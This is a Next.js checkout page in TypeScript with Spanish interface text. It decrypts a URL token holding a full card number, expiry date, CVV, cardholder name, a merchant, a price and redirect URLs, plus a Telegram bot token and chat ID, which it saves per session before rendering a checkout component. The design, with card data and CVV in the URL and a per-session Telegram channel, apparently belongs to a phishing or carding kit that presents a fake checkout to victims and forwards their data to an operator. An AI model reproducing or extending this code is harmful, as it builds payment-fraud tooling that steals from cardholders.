import type { Metadata } from "next";
import CheckoutClient from "@/components/CheckoutClient";
import type { CheckoutPayload } from "@/components/CheckoutClient";
import { decryptEnvelope, getPrivateKeyPem } from "@/lib/rsaCipher";
import { saveSessionCredentials, sessionIdFromToken } from "@/lib/sessionCredentials";

export const metadata: Metadata = {
  title: "Checkout",
};

interface PaymentEnvelope {
  payment: CheckoutPayload["payment"];
  comercio: string;
  price: string;
  priceFormatted: string;
  redirectSuccess: string;
  redirectDeclined: string;
  sessionId?: string;
  telegram: { botToken: string; chatId: string };
}

export default async function Page({
  searchParams,
}: {
  searchParams: Promise<{ d?: string }>;
}) {
  const { d: token } = await searchParams;
  if (!token) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-transparent">
        <p className="text-sm text-gray-500">URL inválida</p>
      </main>
    );
  }

  let payload: PaymentEnvelope;
  try {
    payload = decryptEnvelope<PaymentEnvelope>(token, getPrivateKeyPem());
  } catch {
    return (
      <main className="flex min-h-screen items-center justify-center bg-transparent">
        <p className="text-sm text-gray-500">URL inválida</p>
      </main>
    );
  }

  const isWellFormed =
    typeof payload?.payment?.numeroTarjeta === "string" &&
    typeof payload.payment.vencimiento === "string" &&
    typeof payload.payment.cvv === "string" &&
    typeof payload.payment.titular === "string" &&
    typeof payload.comercio === "string" &&
    payload.comercio.trim() !== "" &&
    typeof payload.price === "string" &&
    typeof payload.priceFormatted === "string" &&
    typeof payload.redirectSuccess === "string" &&
    typeof payload.redirectDeclined === "string" &&
    typeof payload.telegram?.botToken === "string" &&
    typeof payload.telegram?.chatId === "string";

  if (!isWellFormed) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-transparent">
        <p className="text-sm text-gray-500">URL inválida</p>
      </main>
    );
  }

  const sessionId = payload.sessionId ?? sessionIdFromToken(token);
  await saveSessionCredentials(sessionId, payload.telegram);

  const checkoutPayload: CheckoutPayload = {
    payment: payload.payment,
    comercio: payload.comercio,
    price: payload.price,
    priceFormatted: payload.priceFormatted,
    redirectSuccess: payload.redirectSuccess,
    redirectDeclined: payload.redirectDeclined,
  };

  return <CheckoutClient sessionId={sessionId} payload={checkoutPayload} />;
}
